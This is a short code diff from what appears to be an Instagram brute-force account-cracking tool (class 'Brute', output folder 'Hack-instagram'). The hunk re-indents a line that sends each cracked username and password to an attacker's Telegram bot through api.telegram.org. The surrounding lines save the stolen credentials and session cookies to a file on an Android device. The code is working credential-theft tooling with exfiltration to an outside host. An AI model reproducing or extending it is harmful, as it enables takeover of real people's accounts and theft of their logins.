@@ -530,7 +530,7 @@ class Brute:
                         with lock:
                             open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦/حسابات Ok-CP/حسابات-OK.txt', 'a').write(f'{user}|{pswd}\n{cookie}\n')
                             console.print(f"\r [bold green]         𖣘─────────────────━﴾𓆩OK𓆪﴿━─────────────────𖣘            \n[bold green]           ├ {user} | {pswd}\n[bold green]           ├ OK:{B2} {self.ok}\n[bold green][🌐]= 𝙲𝙾𝙾𝙺𝙸𝙴𝚂└──>{B2} {cookie}\n")
-                                                requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str('✵ -OK : '+user+' ׀ '+pswd))
+                            requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str('✵ -OK : '+user+' ׀ '+pswd))
                             cek_DYNO(user, cookie_file_path)
                             break
 
